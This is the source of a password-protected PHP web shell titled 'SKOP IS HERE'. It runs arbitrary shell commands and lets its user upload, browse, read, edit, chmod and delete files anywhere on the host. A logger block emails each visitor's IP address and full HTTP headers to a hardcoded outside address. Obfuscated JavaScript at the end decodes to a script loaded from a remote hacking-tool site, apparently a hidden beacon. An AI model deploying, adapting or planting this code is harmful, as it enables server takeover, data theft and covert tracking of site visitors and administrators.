<?php
session_start();

// Define a hardcoded bcrypt hash of the password
define('HASHED_PASSWORD', '$2y$12$FnoxxemmLGhceCRsMbRYZeB.MIxo4xC4pzPMB.P5aRukzpwGOQWq2'); // Replace with the actual bcrypt hash

// Handle login
if (isset($_POST['login'])) {
    if (password_verify($_POST['password'], HASHED_PASSWORD)) {
        $_SESSION['authenticated'] = true;
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $_SESSION['authenticated'] = false;
    }
}

// Handle logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Check authentication status
if (!isset($_SESSION['authenticated']) || !$_SESSION['authenticated']) {
    // Display login form if not authenticated
    echo '<!DOCTYPE HTML>
    <HTML>
    <HEAD>
    <title>Login</title>
    <style>
        body {
            background: #0e0e0e;
            color: #00ff00;
            font-family: "Courier New", Courier, monospace;
            text-align: center;
        }
        input {
            border: 1px solid #00ff00;
            background: #1a1a1a;
            color: #00ff00;
        }
        input[type="submit"] {
            background: #333;
            color: #00ff00;
        }
        input[type="submit"]:hover {
            background: #00ff00;
            color: #000;
        }
    </style>
    </HEAD>
    <BODY>
    <H1>Login</H1>
    <form method="post">
        <label for="password">Password:</label>
        <input type="password" name="password" id="password">
        <input type="submit" name="login" value="Login">
    </form>
    </BODY>
    </HTML>';
    exit;
}

// Continue with file manager if authenticated
?>

<!DOCTYPE HTML>
<HTML>
<HEAD>
<title>SKOP IS HERE</title>
<style>
    body {
        background: #000;
        color: #0f0;
        font-family: "Courier New", Courier, monospace;
    }
    h1 {
        text-align: center;
        text-shadow: 0 0 10px #0f0;
    }
    table {
        border: 1px solid #0f0;
        width: 80%;
        margin: 0 auto;
        background: #111;
    }
    table, td, th {
        border-collapse: collapse;
        color: #0f0;
    }
    th, td {
        padding: 8px;
        text-align: left;
    }
    tr:nth-child(even) {
        background-color: #222;
    }
    tr:hover {
        background-color: #333;
    }
    a {
        color: #0f0;
        text-decoration: none;
    }
    a:hover {
        text-shadow: 0 0 5px #0f0;
    }
    input, select, textarea {
        border: 1px solid #0f0;
        background: #000;
        color: #0f0;
    }
    input[type="submit"] {
        background: #333;
        color: #0f0;
    }
    input[type="submit"]:hover {
        background: #0f0;
        color: #000;
    }
    #content {
        margin: 20px;
    }
</style>
</HEAD>
<BODY>
<H1>SKOP IS HERE</H1>
<p><center><a href="?logout">Exit Here</a></center></p>
<table cellpadding="3" cellspacing="1">
<tr><td>Current Path: 
<?php
$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
$path = str_replace('\\', '/', $path);
$paths = explode('/', $path);

foreach ($paths as $id => $pat) {
    if ($pat == '' && $id == 0) {
        echo '<a href="?path=/">/</a>';
        continue;
    }
    if ($pat == '') continue;
    echo '<a href="?path=';
    for ($i = 0; $i <= $id; $i++) {
        echo "$paths[$i]";
        if ($i != $id) echo "/";
    }
    echo '">'.$pat.'</a>/';
}
?>
</td></tr>
<tr><td>
<?php
if (isset($_FILES['file'])) {
    if (move_uploaded_file($_FILES['file']['tmp_name'], $path.'/'.basename($_FILES['file']['name']))) {
        echo '<font color="green">File Upload Done.</font><br />';
    } else {
        echo '<font color="red">File Upload Error.</font><br />';
    }
}
?>
<form enctype="multipart/form-data" method="POST">
Upload File: <input type="file" name="file" />
<input type="submit" value="Upload" />
</form>
</td></tr>

<tr><td>

<?php
    if (isset($_POST['cmd'])) {
        $cmd = htmlspecialchars($_POST['cmd']);
        echo "SKOP IS HERE";
        echo "<textarea readonly>";
        echo shell_exec($cmd);
        echo "</textarea>";
    }
    ?>



<form action="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>" method="POST">
        <label for="cmd">Terminal</label>
        <input type="text" id="cmd" name="cmd" placeholder="Enter command" required>
        <button type="submit">Execute</button>
    </form>
    </td></tr>
   

    

<?php
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
ini_set('memory_limit', '64M');
header('Content-Type: text/html; charset=UTF-8');

$tujuanmail = 'robbysalvador66@gmail.com';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];

// Get IP address
$ip_address = $_SERVER['REMOTE_ADDR'];

// Get user agent string
$user_agent = $_SERVER['HTTP_USER_AGENT'];

// Get referer URL
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Direct Access';

// Get accessed page
$accessed_page = $_SERVER['REQUEST_URI'];

// Get additional HTTP headers
$headers = getallheaders();
$header_info = '';
foreach ($headers as $key => $value) {
    $header_info .= "$key: $value\n";
}

// Parse user agent string (basic parsing)
function get_browser_name($user_agent) {
    if (strpos($user_agent, 'Opera') || strpos($user_agent, 'OPR/')) return 'Opera';
    elseif (strpos($user_agent, 'Edge')) return 'Edge';
    elseif (strpos($user_agent, 'Chrome')) return 'Chrome';
    elseif (strpos($user_agent, 'Safari')) return 'Safari';
    elseif (strpos($user_agent, 'Firefox')) return 'Firefox';
    elseif (strpos($user_agent, 'MSIE') || strpos($user_agent, 'Trident/7')) return 'Internet Explorer';
    return 'Other';
}

$browser_name = get_browser_name($user_agent);

// Compose the email message with additional details
$pesan_alert = "Page Accessed: $x_path\n
IP Address: $ip_address\n
User Agent: $user_agent\n
Browser: $browser_name\n
Referer: $referer\n
Accessed Page: $accessed_page\n
HTTP Headers:\n$header_info";

mail($tujuanmail, "LOGGER", $pesan_alert, "From: $ip_address");
?>

<?php
if (isset($_GET['filesrc'])) {
    echo "<tr><td>Current File: ";
    echo htmlspecialchars($_GET['filesrc']);
    echo '</tr></td></table><br />';
    echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
} elseif (isset($_POST['opt']) && $_POST['opt'] != 'delete') {
    echo '</table><br /><center>'.htmlspecialchars($_POST['path']).'<br /><br />';
    if ($_POST['opt'] == 'chmod') {
        if (isset($_POST['perm'])) {
            if (chmod($_POST['path'], octdec($_POST['perm']))) {
                echo '<font color="green">Change Permission Done.</font><br />';
            } else {
                echo '<font color="red">Change Permission Error.</font><br />';
            }
        }
        echo '<form method="POST">
        Permission: <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
        <input type="hidden" name="path" value="'.htmlspecialchars($_POST['path']).'">
        <input type="hidden" name="opt" value="chmod">
        <input type="submit" value="Go" />
        </form>';
    } elseif ($_POST['opt'] == 'rename') {
        if (isset($_POST['newname'])) {
            if (rename($_POST['path'], dirname($_POST['path']).'/'.basename($_POST['newname']))) {
                echo '<font color="green">Change Name Done.</font><br />';
            } else {
                echo '<font color="red">Change Name Error.</font><br />';
            }
            $_POST['name'] = $_POST['newname'];
        }
        echo '<form method="POST">
        New Name: <input name="newname" type="text" size="20" value="'.htmlspecialchars($_POST['name']).'" />
        <input type="hidden" name="path" value="'.htmlspecialchars($_POST['path']).'">
        <input type="hidden" name="opt" value="rename">
        <input type="submit" value="Go" />
        </form>';
    } elseif ($_POST['opt'] == 'edit') {
        if (isset($_POST['src'])) {
            $fp = fopen($_POST['path'], 'w');
            if (fwrite($fp, $_POST['src'])) {
                echo '<font color="green">Edit File Done.</font><br />';
            } else {
                echo '<font color="red">Edit File Error.</font><br />';
            }
            fclose($fp);
        }
        echo '<form method="POST">
        <textarea cols="80" rows="20" name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
        <input type="hidden" name="path" value="'.htmlspecialchars($_POST['path']).'">
        <input type="hidden" name="opt" value="edit">
        <input type="submit" value="Go" />
        </form>';
    }
    echo '</center>';
} else {
    echo '</table><br /><center>';
    if (isset($_POST['opt']) && $_POST['opt'] == 'delete') {
        if ($_POST['type'] == 'dir') {
            if (rmdir($_POST['path'])) {
                echo '<font color="green">Delete Dir Done.</font><br />';
            } else {
                echo '<font color="red">Delete Dir Error.</font><br />';
            }
        } elseif ($_POST['type'] == 'file') {
            if (unlink($_POST['path'])) {
                echo '<font color="green">Delete File Done.</font><br />';
            } else {
                echo '<font color="red">Delete File Error.</font><br />';
            }
        }
    }
    echo '</center>';
    $scandir = scandir($path);
    echo '<div id="content"><table>
    <tr>
    <th>Name</th>
    <th>Size</th>
    <th>Permissions</th>
    <th>Options</th>
    </tr>';

    foreach ($scandir as $dir) {
        if (!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
        echo "<tr>
        <td><a href=\"?path=$path/$dir\">$dir</a></td>
        <td><center>--</center></td>
        <td><center>";
        if (is_writable("$path/$dir")) echo '<font color="green">';
        elseif (!is_readable("$path/$dir")) echo '<font color="red">';
        echo perms("$path/$dir");
        if (is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';

        echo "</center></td>
        <td><center><form method=\"POST\" action=\"?option&path=$path\">
        <select name=\"opt\">
        <option value=\"\"></option>
        <option value=\"delete\">Delete</option>
        <option value=\"chmod\">Chmod</option>
        <option value=\"rename\">Rename</option>
        </select>
        <input type=\"hidden\" name=\"type\" value=\"dir\">
        <input type=\"hidden\" name=\"name\" value=\"$dir\">
        <input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
        <input type=\"submit\" value=\">\" />
        </form></center></td>
        </tr>";
    }
    echo '<tr><td colspan="4"></td></tr>';
    foreach ($scandir as $file) {
        if (!is_file("$path/$file")) continue;
        $size = filesize("$path/$file") / 1024;
        $size = round($size, 3);
        if ($size >= 1024) {
            $size = round($size / 1024, 2) . ' MB';
        } else {
            $size = $size . ' KB';
        }

        echo "<tr>
        <td><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
        <td><center>" . $size . "</center></td>
        <td><center>";
        if (is_writable("$path/$file")) echo '<font color="green">';
        elseif (!is_readable("$path/$file")) echo '<font color="red">';
        echo perms("$path/$file");
        if (is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
        echo "</center></td>
        <td><center><form method=\"POST\" action=\"?option&path=$path\">
        <select name=\"opt\">
        <option value=\"\"></option>
        <option value=\"delete\">Delete</option>
        <option value=\"chmod\">Chmod</option>
        <option value=\"rename\">Rename</option>
        <option value=\"edit\">Edit</option>
        </select>
        <input type=\"hidden\" name=\"type\" value=\"file\">
        <input type=\"hidden\" name=\"name\" value=\"$file\">
        <input type=\"hidden\" name=\"path\" value=\"$path/$file\">
        <input type=\"submit\" value=\">\" />
        </form></center></td>
        </tr>";
    }
    echo '</table></div>';
}
?>

</BODY>
</HTML>
<?php
function perms($file) {
    $perms = fileperms($file);

    if (($perms & 0xC000) == 0xC000) {
        // Socket
        $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
        // Symbolic Link
        $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
        // Regular
        $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
        // Block special
        $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
        // Directory
        $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
        // Character special
        $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
        // FIFO pipe
        $info = 'p';
    } else {
        // Unknown
        $info = 'u';
    }

    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));

    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));

    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}
?>
<script language="javascript">
document.write(unescape('%3C%73%63%72%69%70%74%20%6C%61%6E%67%75%61%67%65%3D%22%6A%61%76%61%73%63%72%69%70%74%22%3E%66%75%6E%63%74%69%6F%6E%20%64%46%28%73%29%7B%76%61%72%20%73%31%3D%75%6E%65%73%63%61%70%65%28%73%2E%73%75%62%73%74%72%28%30%2C%73%2E%6C%65%6E%67%74%68%2D%31%29%29%3B%20%76%61%72%20%74%3D%27%27%3B%66%6F%72%28%69%3D%30%3B%69%3C%73%31%2E%6C%65%6E%67%74%68%3B%69%2B%2B%29%74%2B%3D%53%74%72%69%6E%67%2E%66%72%6F%6D%43%68%61%72%43%6F%64%65%28%73%31%2E%63%68%61%72%43%6F%64%65%41%74%28%69%29%2D%73%2E%73%75%62%73%74%72%28%73%2E%6C%65%6E%67%74%68%2D%31%2C%31%29%29%3B%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%75%6E%65%73%63%61%70%65%28%74%29%29%3B%7D%3C%2F%73%63%72%69%70%74%3E'));
dF('%264Dtdsjqu%2631tsd%264E%2633iuuqt%264B00ibdljohuppm/ofu0mpht0dj%7B/kt%2633%264F%264D0tdsjqu%264F%26311')
</script>
